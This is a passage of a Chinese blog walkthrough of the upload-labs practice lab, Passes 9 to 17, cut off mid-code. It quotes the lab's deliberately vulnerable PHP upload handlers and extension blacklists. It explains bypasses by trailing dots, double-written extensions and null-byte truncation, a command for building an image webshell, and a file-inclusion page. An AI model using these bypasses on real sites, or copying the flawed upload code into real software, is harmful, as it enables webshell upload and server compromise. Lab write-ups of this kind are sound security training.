punctuation">,</span><span class="token double-quoted-string string">".php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aScx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aShx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cEr"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".sWf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".swf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>黑名单限制，咋一看好像可以绕过的都被限制了，但是仔细看最后拼接的文件名是处理后的文件名，所以可以上传”1.php. .”，经过处理后的文件名就变成”1.php.”，最后由于windows特性会将<strong>“.”</strong>自动去除来绕过</p><h2 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10-双写绕过"></a>Pass-10-双写绕过</h2><p>看源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"swf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$deny_ext</span><span class="token punctuation">,</span><span class="token double-quoted-string string">""</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code>只对文件后缀名进行一次过滤，双写文件名绕过。</p><p>所以用双写绕过，构造**.pphphp<strong>去除php后就变成</strong>.php**</p><p><img src="/2020/11/16/upload-labs/image-20201118221712511.png" alt="image-20201118221712511" loading="lazy"></p><h2 id="Pass-11-00截断"><a href="#Pass-11-00截断" class="headerlink" title="Pass-11-00截断"></a>Pass-11-00截断</h2><p>看源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'jpg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'png'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'save_path'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code>     </p><p>白名单判断，但$img_path是直接拼接，因此可以利用%00截断绕过。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//%00截断适用条件</span><span class="token constant">PHP</span> 版本 <span class="token operator">&lt;</span> <span class="token number">5.3</span><span class="token number">.4</span>php<span class="token punctuation">.</span>ini 中 magic_quotes_gpc<span class="token operator">=</span>off<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Pass-12-00截断"><a href="#Pass-12-00截断" class="headerlink" title="Pass-12-00截断"></a>Pass-12-00截断</h2><p>看源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'jpg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'png'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'save_path'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"上传失败"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></p><p><code>$img_path = $_POST[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></p><p>对比发现save_path参数由原来的GET方式传递变成了POST方式传递</p><p>还是使用00截断，但不能再使用%00截断, 因为%00截断在 GET 中被 url 解码之后是空字符，但是在 POST 中%00不会被 url 解码, 所以通过burp修改hex值为00进行截断</p><h2 id="Pass-13-图片马"><a href="#Pass-13-图片马" class="headerlink" title="Pass-13-图片马"></a>Pass-13-图片马</h2><p>可以看到关卡要求使用图片马</p><p>可以使用以下CMD命令制作图片马</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">copy 1.jpg &#x2F;b + 1.php &#x2F;a shell.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后直接上传即可</p><p>直接访问图片并不能把图片当做PHP解析，因此还需要利用文件包含漏洞（）</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">##include.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*本页面存在文件包含漏洞，用于测试图片马是否能正常运行！*/</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Content-Type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Pass-14-getimagesize-图片马"><a href="#Pass-14-getimagesize-图片马" class="headerlink" title="Pass-14-getimagesize()-图片马"></a>Pass-14-getimagesize()-图片马</h2><p>发现多了一个getimagesize函数，getimagesize就是个获取图片信息的文件。同样我们也可以通过上面的方法绕过,也成功解析</p><h2 id="Pass-15-exif-imagetype-图片马"><a href="#Pass-15-exif-imagetype-图片马" class="headerlink" title="Pass-15-exif_imagetype()-图片马"></a>Pass-15-exif_imagetype()-图片马</h2><p>发现开启了php_exif模块检测文件信息<br>用上面的文件包含依然可以解析图片</p><h2 id="Pass-16-二次渲染绕过"><a href="#Pass-16-二次渲染绕过" class="headerlink" title="Pass-16-二次渲染绕过"></a>Pass-16-二次渲染绕过</h2><p>参考：<a href="https://xz.aliyun.com/t/2657#toc-13">upload-labs之pass 16详细分析</a></p><h2 id="Pass-17-条件竞争"><a href="#Pass-17-条件竞争" class="headerlink" title="Pass-17-条件竞争"></a>Pass-17-条件竞争</h2><p>看源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'jpg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'png'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$upload_file</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>             <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token 